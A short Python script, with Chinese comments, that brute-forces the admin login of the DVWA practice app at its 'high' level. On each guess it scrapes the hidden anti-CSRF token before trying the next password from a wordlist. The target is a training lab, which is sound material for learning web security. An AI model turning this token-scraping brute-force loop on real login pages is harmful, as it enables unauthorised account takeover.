#dvwa 爆破high等级获取user_token值，发起爆破
import requests
from bs4 import BeautifulSoup

headers = {
    'Host':'192.168.121.115',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding':'gzip, deflate',
    'Connection':'close',
    'Referer':'http://192.168.121.115/DVWA/vulnerabilities/brute/',
    'Cookie':'security=high; PHPSESSID=qljji7tmh0mhh9n2i957dvpf17',
    'Upgrade-Insecure-Requests':'1'
}
url = 'http://192.168.121.115/DVWA-kb/vulnerabilities/brute/'

#读取文件，设置参数发起爆破
 #初始user_token
fp = open('./ruokoulin.txt','r')
#循环字典
for a in fp.readlines(): 
    #获取user_token
    response = requests.get(headers=headers,url=url).text
    soup = BeautifulSoup(response,'lxml')
    b = soup.find('input',type='hidden')
    user_token = b['value']
    params = {
    'username':'admin',
    'password':a.split(),
    'Login':'Login',
    'user_token':user_token
    }
    r = response=requests.get(url=url,headers=headers,params=params).text
    #获取返回包长度
    response1 = len(r)
    print('%d\t' %response1+a.strip())
fp.close()




